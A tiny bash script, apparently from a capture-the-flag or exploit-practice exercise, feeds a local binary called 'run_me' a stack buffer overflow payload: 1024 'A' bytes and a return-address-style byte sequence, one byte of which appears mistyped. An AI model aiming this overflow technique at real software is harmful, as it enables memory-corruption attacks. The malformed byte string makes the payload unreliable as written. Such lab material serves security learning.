#!/usr/bin/env bash

./run_me $(python3 -c "import sys; sys.stdout.buffer.write(b'\x41' * 1024 + b'\xcd\xab\xcd\ab')")